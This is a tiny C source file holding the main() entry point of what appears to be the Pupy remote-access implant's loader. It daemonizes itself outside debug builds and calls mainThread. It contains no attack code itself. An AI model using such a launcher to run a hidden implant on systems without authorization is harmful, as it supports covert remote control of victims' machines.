#include "pupy_load.h"
#include "daemonize.h"

int main(int argc, char *argv[]) {
#ifndef DEBUG
    daemonize(true);
#endif

	return mainThread(argc, argv);
}
